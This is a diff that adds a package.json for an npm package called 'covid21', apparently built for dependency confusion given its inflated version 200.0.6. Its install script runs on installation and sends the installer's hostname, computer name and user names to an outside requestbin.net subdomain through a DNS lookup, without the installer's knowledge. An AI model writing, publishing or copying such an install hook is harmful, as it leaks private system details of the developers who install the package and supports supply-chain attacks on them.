@@ -1,0 +1,11 @@
+{
+  "name": "covid21",
+  "version": "200.0.6",
+  "description": "covid21: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+    "install": "nslookup `hostname`-%computername%.`whoami`-%username%.covid21.a430051ef18acd86255c.d.requestbin.net"
+  },
+  "author": "another noob developer",
+  "license": "ISC"
+}
